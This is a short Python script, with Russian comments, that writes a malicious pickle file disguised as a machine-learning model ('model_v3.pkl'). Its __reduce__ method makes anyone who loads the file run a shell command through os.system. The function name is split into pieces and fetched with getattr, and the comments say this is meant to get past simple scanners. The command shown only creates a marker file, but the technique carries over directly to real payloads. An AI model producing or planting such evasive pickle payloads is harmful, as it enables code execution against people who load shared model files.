import pickle

class GhostModel:
    def __reduce__(self):
        # Вместо eval(payload) мы вызовем getattr на модуле os, 
        # чтобы получить функцию 'system', но склеим это имя из кусочков.
        # Это часто обходит простые сканеры.
        
        import os
        # Склеиваем слово 'sys' + 'tem'
        func_name = "sys" + "tem"
        cmd = "touch /app/GHOST_WIN.txt"
        
        # Используем магию getattr
        return (getattr(os, func_name), (cmd,))

with open('model_v3.pkl', 'wb') as f:
    pickle.dump(GhostModel(), f)

print("Призрачная модель 'model_v3.pkl' создана!")
